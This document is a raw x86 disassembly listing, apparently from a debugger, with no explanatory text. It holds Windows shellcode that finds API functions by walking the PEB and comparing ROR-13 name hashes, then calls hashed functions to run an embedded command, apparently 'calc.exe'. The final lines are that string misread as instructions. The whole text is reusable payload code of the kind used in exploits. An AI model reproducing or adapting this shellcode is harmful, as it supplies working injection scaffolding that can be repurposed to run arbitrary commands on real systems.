cld                                  
call E674EF           
pushad                               
mov ebp,esp                          
xor eax,eax                          
mov edx,dword ptr fs:[eax+30]        
mov edx,dword ptr ds:[edx+C]         
mov edx,dword ptr ds:[edx+14]        
mov esi,dword ptr ds:[edx+28]        
movzx ecx,word ptr ds:[edx+26]       
xor edi,edi                          
lodsb                                
cmp al,61                            
jl E6748C             
sub al,20                            
ror edi,D                            
add edi,eax                          
loop E67485           
push edx                             
push edi                             
mov edx,dword ptr ds:[edx+10]        
mov ecx,dword ptr ds:[edx+3C]        
mov ecx,dword ptr ds:[ecx+edx+78]    
jecxz E674E9          
add ecx,edx                          
push ecx                             
mov ebx,dword ptr ds:[ecx+20]        
add ebx,edx                          
mov ecx,dword ptr ds:[ecx+18]        
jecxz E674E8          
dec ecx                              
mov esi,dword ptr ds:[ebx+ecx*4]     
add esi,edx                          
xor edi,edi                          
lodsb                                
ror edi,D                            
add edi,eax                          
cmp al,ah                            
jne E674B6            
add edi,dword ptr ss:[ebp-8]         
cmp edi,dword ptr ss:[ebp+24]        
jne E674AC            
pop eax                              
mov ebx,dword ptr ds:[eax+24]        
add ebx,edx                          
mov cx,word ptr ds:[ebx+ecx*2]       
mov ebx,dword ptr ds:[eax+1C]        
add ebx,edx                          
mov eax,dword ptr ds:[ebx+ecx*4]     
add eax,edx                          
mov dword ptr ss:[esp+24],eax        
pop ebx                              
pop ebx                              
popad                                
pop ecx                              
pop edx                              
push ecx                             
jmp eax                              
pop edi                              
pop edi                              
pop edx                              
mov edx,dword ptr ds:[edx]           
jmp E6747C            
pop ebp                              
push 1                               
lea eax,dword ptr ss:[ebp+B2]        
push eax                             
push 876F8B31                        
call ebp                             
mov ebx,A2A1DE0                      
push 9DBD95A6                        
call ebp                             
cmp al,6                             
jl E6751A             
cmp bl,E0                            
jne E6751A            
mov ebx,6F721347                     
push 0                               
push ebx                             
call ebp                             
arpl word ptr ds:[ecx+6C],sp         
arpl word ptr ds:[esi],bp            
js E6758C             
add byte ptr ds:[eax],al             